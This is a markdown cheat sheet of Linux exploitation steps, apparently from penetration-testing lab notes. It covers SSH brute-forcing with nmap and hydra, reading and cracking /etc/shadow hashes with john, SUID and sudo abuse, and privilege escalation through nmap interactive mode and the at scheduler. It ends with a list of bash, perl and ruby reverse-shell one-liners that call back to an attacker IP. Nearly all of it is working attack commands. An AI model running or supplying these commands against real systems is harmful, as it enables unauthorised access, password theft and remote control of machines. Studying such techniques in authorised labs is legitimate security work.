#Linux Exploitation
```bash
nmap 2.0.0.22 target 1(metasploit)
```
- target 1 - port 22 ssh open

Lets try brutforce login
```bash
nmap 2.0.0.22 -p 22 --script ssh-brute
```
- After sucessfull passowrd cracking login with the crdentials
```bash
ssh administrator@2.0.0.22
whoami
id if uid=1001 - secondory regular user so 1000 is regular user
cat /etc/password - you can find the other users
```

Horizontal escalation
-------------------------------
since we know the user name lets try the password attack
```bash
hydra -l marlinspike -P /usr/share/wordlists/john/lst 2.0.0.22 ssh -e nsr -t 4
```

- anothe way to know the password is
```bash
cat /etc/shadow - contails passowrd hashes
```
- copy the hashes in a file in kali and try john
```bash
nano hash.txt
john hash.txt
# for the already cracked hashes
john --show hash.txt
```
check weather the /etc/password and /etc/shadow are having write permissions

-To find the suid files
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```
- if the linux machine is having **nmap** installe in suid file then we can use it to escalate the privileges
```bash
nmap --interactive
nmap> ! cat /etc/shadow
nmap> ! cat /etc/passwd
nmap> ! nc <kali IP> 1234 -e /bin/bash

```
- In kali machine run a netcat listener
```bash
nc -lvp 1234    
```
- GTFOBINS is helpful to find the suid files and how to use them to escalate the privileges
Gtfobins link: https://gtfobins.github.io/

- if there is any error while connecting try this 
```bash
kali-tweaks
```
- This box will opens now select **Hardining** then enable **SSH CLIENT** then click on **Apply**  button 

<img src="image-1.png" alt="alt text" width="400"/>
<img src="image-2.png" alt="alt text" width="400"/>
<img src="image-3.png" alt="alt text" width="400"/>
- if you are able to see the ALL in the **sudo -l** then you can run any command with sudo
````bash
sudo -l
````
- if you are able to see the ALL in the **sudo -i** 
````bash
sudo -i
````
- if you see the **at**  try this
```bash
COMMAND="id > hi.txt"
echo "$COMMAND" | at now
cat hi.txt

COMMAND="cat /etc/shadow > hi.txt"
echo "$COMMAND" | at now
cat hi.txt

or you can try bellow command

echo "whoami > hi.txt" | at now
cat hi.txt

```
## Kernal Vulnerabilities and Application Vulnerabilities

- To list all the packeges installed in the linux machine
```bash
apt list --installed
dpkg --list
dpkg -l
dpkg -l | grep -v '^ii  lib'
apt list --installed | grep -v '^lib'
ls /usr/share/applications/
```
- If you don't have proper shell then try this command if it having python or bash or sh
```bash
python -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");'
sh -i
bash -i
bash -i >& /dev/tcp/<kali IP>/1234 0>&1
sh -i >& /dev/tcp/<kali IP>/1234 0>&1
perl -e 'exec "/bin/bash";'
perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -e 'exec "/bin/bash"'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>",<port>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```